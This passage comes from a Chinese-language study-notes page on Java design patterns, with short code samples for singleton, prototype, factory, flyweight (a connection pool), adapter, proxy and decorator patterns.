</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    <span class="comment">//实例化</span></span><br><span class="line">    INSTANCE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;枚举单例&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Singleton instance = Singleton.INSTANCE;</span><br><span class="line">    instance.get();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举实例是静态的，创建时线程安全</li>
<li>不能被反射破坏单例</li>
<li>枚举类默认实现序列化接口，不会被反序列破坏单例</li>
<li>属于饿汉式单例</li>
</ul>
<h3 id="2、原型模式"><a href="#2、原型模式" class="headerlink" title="2、原型模式"></a>2、原型模式</h3><blockquote>
<p>Prototype</p>
<p><strong>用一个已经创建的实例作为原型，通过拷贝这些原型创建新的对象</strong></p>
<p>Object类clone()方法提供了浅克隆，实现Cloneable接口实现浅克隆</p>
</blockquote>
<p><strong>应用</strong></p>
<ul>
<li>对象的创建过程比较麻烦，但复制比较简单</li>
<li>对象之间相同或相似，仅有个别属性不同</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        Dog dog=<span class="keyword">new</span> Dog();</span><br><span class="line">        dog.id=<span class="keyword">this</span>.id;</span><br><span class="line">        dog.name=<span class="keyword">this</span>.name;</span><br><span class="line">        <span class="keyword">return</span> dog;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Dog dog=<span class="keyword">new</span> Dog();</span><br><span class="line"><span class="comment">//需要强转</span></span><br><span class="line">Dog clone = (Dog) dog.clone();</span><br><span class="line">System.out.println(dog);</span><br><span class="line">System.out.println(clone);</span><br></pre></td></tr></table></figure>

<p><strong>改进</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">copy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Student std = <span class="keyword">new</span> Student();</span><br><span class="line">        std.id = <span class="keyword">this</span>.id;</span><br><span class="line">        std.name = <span class="keyword">this</span>.name;</span><br><span class="line">        std.score = <span class="keyword">this</span>.score;</span><br><span class="line">        <span class="keyword">return</span> std;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="3、工厂模式"><a href="#3、工厂模式" class="headerlink" title="3、工厂模式"></a>3、工厂模式</h3><h4 id="3-1-简单工厂模式"><a href="#3-1-简单工厂模式" class="headerlink" title="3.1 简单工厂模式"></a>3.1 简单工厂模式</h4><blockquote>
<ul>
<li>将全部创建逻辑集中到了一个工厂类中；</li>
<li>它所能创建的类只能是事先考虑到的，如果需要添加新的类，则就需要改变工厂类了，而增加、删除某个子类对象的创建都需要打开简单工厂类来进行修改违背了开闭原则。</li>
<li>又称为<strong>静态工厂模式</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">interface</span> <span class="title">Oberation</span></span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA,<span class="keyword">double</span> numberB)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//具体实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add</span> <span class="keyword">implements</span> <span class="title">Operation</span></span>&#123;</span><br><span class="line">    <span class="comment">// 加法计算</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA, <span class="keyword">double</span> numberB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numberA + numberB;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sub</span> <span class="keyword">implements</span> <span class="title">Operation</span></span>&#123;</span><br><span class="line">    <span class="comment">// 减法计算</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA, <span class="keyword">double</span> numberB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numberA-numberB;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义简单工厂类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleFatory</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 简单工厂，根据字符串创建相应的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Operation <span class="title">createOperation</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        Operation operationObj = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">switch</span> (name) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">                operationObj = <span class="keyword">new</span> Add();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">                operationObj = <span class="keyword">new</span> Sub();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     	<span class="keyword">return</span> operationObj;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Opera</span></span>&#123;</span><br><span class="line">    Operation op=SimpleFatort.createOperation(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">    op.getResult(<span class="number">3</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="3-2-工厂方法模式"><a href="#3-2-工厂方法模式" class="headerlink" title="3.2 工厂方法模式"></a>3.2 工厂方法模式</h4><blockquote>
<ul>
<li>用户只需要知道具体工厂的名称就可得到所要的产品，无须知道产品的具体创建过程；</li>
<li>在系统增加新的产品时只需要添加具体产品类和对应的具体工厂类，无须对原工厂进行任何修改，满足开闭原则</li>
</ul>
</blockquote>
<blockquote>
<ol>
<li>抽象工厂（Abstract Factory）：提供了创建产品的接口，调用者通过它访问具体工厂的工厂方法 newProduct() 来创建产品。</li>
<li>具体工厂（ConcreteFactory）：主要是实现抽象工厂中的抽象方法，完成具体产品的创建。</li>
<li>抽象产品（Product）：定义了产品的规范，描述了产品的主要特性和功能。</li>
<li>具体产品（ConcreteProduct）：实现了抽象产品角色所定义的接口，由具体工厂来创建，它同具体工厂之间一一对应。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//工厂抽象接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Factory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Operation <span class="title">createOperation</span><span class="params">()</span> </span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//产品抽象接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Operation</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA,<span class="keyword">double</span> numberB)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加法类工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddFactory</span> <span class="keyword">implements</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Operation <span class="title">createOperation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;加法运算&quot;</span>);</span><br><span class="line">        <span class="comment">//加法对象</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Add();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 减法类工厂</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SubFactory</span> <span class="keyword">implements</span> <span class="title">Factory</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Operation <span class="title">createOperation</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;减法运算&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Sub();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add</span> <span class="keyword">implements</span> <span class="title">Operation</span></span>&#123;</span><br><span class="line">    <span class="comment">// 加法计算</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA, <span class="keyword">double</span> numberB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numberA + numberB;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Sub</span> <span class="keyword">implements</span> <span class="title">Operation</span></span>&#123;</span><br><span class="line">    <span class="comment">// 减法计算</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getResult</span><span class="params">(<span class="keyword">double</span> numberA, <span class="keyword">double</span> numberB)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> numberA-numberB;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 使用反射机制实例化工厂对象，因为字符串是可以通过变量改变的</span></span><br><span class="line">        Factory addFactory = (Factory) Class.forName(<span class="string">&quot;org.zero01.factory.AddFactory&quot;</span>).newInstance();</span><br><span class="line">        Factory subFactory=(Factory) Class.forName(<span class="string">&quot;org.zero01.factory.SubFactory&quot;</span>).newInstance();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 通过工厂对象创建相应的实例对象</span></span><br><span class="line">        Operation add = addFactory.createOperation();</span><br><span class="line">        Operation sub = subFactory.createOperation();</span><br><span class="line"> </span><br><span class="line">        System.out.println(add.getResult(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">        System.out.println(sub.getResult(<span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong></p>
<blockquote>
<ul>
<li>客户只知道创建产品的工厂名，而不知道具体的产品名。如 TCL 电视工厂、海信电视工厂等。</li>
<li>创建对象的任务由多个具体子工厂中的某一个完成，而抽象工厂只提供创建产品的接口。</li>
<li>客户不关心创建产品的细节，只关心产品的品牌。</li>
</ul>
</blockquote>
<h4 id="3-3-抽象工厂模式"><a href="#3-3-抽象工厂模式" class="headerlink" title="3.3 抽象工厂模式"></a>3.3 抽象工厂模式</h4><blockquote>
<p>抽象工厂模式将考虑多等级产品的生产，将同一个具体工厂所生产的位于不同等级的一组产品称为一个产品族</p>
<p><strong>应用</strong></p>
<ul>
<li>系统中有多个产品族，每个具体工厂创建同一族但属于不同等级结构的产品。</li>
<li>系统一次只可能消费其中某一族产品，即同族的产品一起使用。</li>
</ul>
<p><strong>优点</strong></p>
<ul>
<li>可以在类的内部对产品族中相关联的多等级产品共同管理，而不必专门引入多个新的类来进行管理。</li>
<li>当增加一个<strong>新的产品族</strong>时不需要修改原代码，满足开闭原则。</li>
<li>但当产品族中需要增加一个<strong>新种类的产品</strong>时，则所有的工厂类都需要进行修改，不满足开闭原则。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Horse</span> <span class="keyword">implements</span> <span class="title">Aniaml</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Plant</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruitage</span> <span class="keyword">implements</span> <span class="title">Plant</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象工厂</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Farm</span></span>&#123;</span><br><span class="line">    <span class="comment">//Animal产品</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Animal <span class="title">newAnimal</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">//Plant产品</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Plant <span class="title">newPlant</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体工厂</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SGfarm</span> <span class="keyword">implements</span> <span class="title">Farm</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Animal <span class="title">newAnimal</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Cattle();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Plant <span class="title">newPlant</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Vegetables();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二、结构型模式"><a href="#二、结构型模式" class="headerlink" title="二、结构型模式"></a>二、结构型模式</h2><h3 id="1、享元模式"><a href="#1、享元模式" class="headerlink" title="1、享元模式"></a>1、享元模式</h3><blockquote>
<p><strong>重用数量有限的同一类对象</strong></p>
</blockquote>
<h4 id="1-1-体现"><a href="#1-1-体现" class="headerlink" title="1.1 体现"></a>1.1 体现</h4><p><strong>包装类</strong></p>
<p>Long.valueOf(long l) 避免重复数量的重复创建。-128~127</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title">valueOf</span><span class="params">(<span class="keyword">long</span> l)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> offset = <span class="number">128</span>;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= -<span class="number">128</span> &amp;&amp; l &lt;= <span class="number">127</span>) &#123; <span class="comment">// will cache</span></span><br><span class="line">        <span class="keyword">return</span> LongCache.cache[(<span class="keyword">int</span>)l + offset];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Long(l);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-自定义线程池"><a href="#1-2-自定义线程池" class="headerlink" title="1.2 自定义线程池"></a>1.2 自定义线程池</h4><blockquote>
<p>一次请求到达后，从连接池获取连接，使用完毕再还回连接池。</p>
<p>节约了连接的创建和关闭时间，也实现了<strong>连接的复用</strong>，不至于让庞大的连接数压垮数据库</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Pool pool=<span class="keyword">new</span> Pool(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            Connection connection=pool.borrow();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="keyword">new</span> Random().nextInt(<span class="number">1000</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            pool.free(connection);</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pool</span></span>&#123;</span><br><span class="line">    <span class="comment">//1.连接池大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> poolSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.连接对象 数组</span></span><br><span class="line">    <span class="keyword">private</span> Connection[] connections;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.连接状态数组 0表示空闲 1表示繁忙</span></span><br><span class="line">    <span class="keyword">private</span> AtomicIntegerArray state;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Pool</span><span class="params">(<span class="keyword">int</span> poolSize)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.poolSize = poolSize;</span><br><span class="line">        <span class="keyword">this</span>.connections = <span class="keyword">new</span> Connection[poolSize];</span><br><span class="line">        <span class="keyword">this</span>.state = <span class="keyword">new</span> AtomicIntegerArray(<span class="keyword">new</span> <span class="keyword">int</span>[poolSize]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;poolSize ; i++) &#123;</span><br><span class="line">            connections[i]=<span class="keyword">new</span> MockConnection();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//借连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Connection <span class="title">borrow</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;poolSize; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (state.get(i)==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="comment">//CAS</span></span><br><span class="line">                    <span class="keyword">if</span> (state.compareAndSet(i,<span class="number">0</span>,<span class="number">1</span>))&#123;</span><br><span class="line">                        <span class="keyword">return</span> connections[i];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果没有空闲连接，当前线程进入等待！！！</span></span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.wait();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//归还连接</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">free</span><span class="params">(Connection connection)</span></span>&#123;</span><br><span class="line">        <span class="comment">//判断归还的连接对象是否为连接池的连接！！！</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;poolSize; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (connections[i]==connection) &#123;</span><br><span class="line">                state.set(i,<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (<span class="keyword">this</span>)&#123;</span><br><span class="line">                    <span class="comment">//唤醒wait线程</span></span><br><span class="line">                    <span class="keyword">this</span>.notifyAll();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MockConnection</span> <span class="keyword">implements</span> <span class="title">Connection</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2、适配器模式"><a href="#2、适配器模式" class="headerlink" title="2、适配器模式"></a>2、适配器模式</h3><blockquote>
<p>Adapter</p>
<p><strong>将一个类的接口转换成另一个接口，使得原本接口不兼容而不能工作的类可以工作</strong></p>
<p><code>InputStreamReader</code>、<code>Array.asList(T[])</code></p>
</blockquote>
<h5 id="2-1-自定义适配器"><a href="#2-1-自定义适配器" class="headerlink" title="2.1 自定义适配器"></a>2.1 <strong>自定义适配器</strong></h5><blockquote>
<p>由于new Thread(Runnable runnable)，不能接收Callable接口，可以使用适配器。</p>
</blockquote>
<p><strong>适配器构建</strong></p>
<ul>
<li>实现目标接口Runnable</li>
<li>内部进行接口转化，Callable</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span> <span class="keyword">implements</span> <span class="title">Callable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            System.out.println(sum+=i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunnableAdapter</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Callable callable;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RunnableAdapter</span><span class="params">(Callable callable)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.callable=callable;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            callable.call();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Task task=<span class="keyword">new</span> Task();</span><br><span class="line">    Thread thread=<span class="keyword">new</span> Thread(<span class="keyword">new</span> RunnableAdapter(task));</span><br><span class="line">    thread.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="2-2-API使用"><a href="#2-2-API使用" class="headerlink" title="2.2 API使用"></a>2.2 API使用</h5><blockquote>
<p>string[] ==&gt; Set的构造方法需要一个集合</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashSet</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">    map = <span class="keyword">new</span> HashMap&lt;&gt;(Math.max((<span class="keyword">int</span>) (c.size()/<span class="number">.75f</span>) + <span class="number">1</span>, <span class="number">16</span>));</span><br><span class="line">    addAll(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] strings=&#123;<span class="string">&quot;ag&quot;</span>,<span class="string">&quot;sa&quot;</span>,<span class="string">&quot;sfd&quot;</span>&#125;;</span><br><span class="line">HashSet&lt;String&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;(Arrays.asList(strings));</span><br></pre></td></tr></table></figure>



<blockquote>
<p>InputStream==Reader</p>
<ul>
<li>要求使用字符流，而只提供字节流</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream inputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">Reader reader=<span class="keyword">new</span> InputStreamReader(inputStream);</span><br></pre></td></tr></table></figure>



<h3 id="3、代理模式"><a href="#3、代理模式" class="headerlink" title="3、代理模式"></a>3、代理模式</h3><blockquote>
<p>Proxy</p>
<p><strong>为其他对象提供一种代理以控制对这个对象的访问</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> AProxy implements A&#123;</span><br><span class="line">	<span class="keyword">private</span> A a;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">AProxy</span><span class="params">(A a)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.a=a;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (getCurrentUser().isRoot()) &#123;</span><br><span class="line">        	<span class="keyword">this</span>.a.a();</span><br><span class="line">   		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        	<span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">&quot;Forbidden&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong></p>
<ul>
<li>在客户端与目标对象之间起到一个中介作用和保护目标对象的作用</li>
<li>扩展目标对象的功能</li>
<li>将客户端与目标对象分离，在一定程度上降低了系统的耦合度，增加程序的可扩展性</li>
</ul>
<p><strong>代理类型</strong></p>
<p>远程代理：把对接口的方法访问转换成远程调用，返回结果</p>
<p>虚代理：先让调用者先持有一个代理对象，真正的对象尚未创建。</p>
<p>保护代理：用代理对象控制对原始对象的访问，用于鉴权</p>
<p>​    </p>
<h3 id="4、装饰器模式"><a href="#4、装饰器模式" class="headerlink" title="4、装饰器模式"></a>4、装饰器模式</h3><blockquote>
<p>decorator</p>
<p><strong>动态的给对象添加一些额外的职责</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">             ┌───────────┐</span><br><span class="line">             │ Component │</span><br><span class="line">             └───────────┘</span><br><span class="line">                   ▲</span><br><span class="line">      ┌────────────┼─────────────────┐</span><br><span class="line">      │            │                 │</span><br><span class="line">┌───────────┐┌───────────┐     ┌───────────┐</span><br><span class="line">│ComponentA ││ComponentB │...  │ Decorator │</span><br><span class="line">└───────────┘└───────────┘     └───────────┘</span><br><span class="line">                                     ▲</span><br><span class="line">                              ┌──────┴──────┐</span><br><span class="line">                              │             │</span><br><span class="line">                        ┌───────────┐ ┌───────────┐</span><br><span class="line">                        │DecoratorA │ │DecoratorB │...</span><br><span class="line">                        └───────────┘ └───────────┘</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>把核心功能和附加功能给分开了</strong></p>
<p>核心功能指<code>FileInputStream</code>这些真正读数据的源头，附加功能指加缓冲、压缩、解密这些功能。</p>
<p>新增核心功能，就增加Component的子类，例如<code>ByteInputStream</code>。</p>
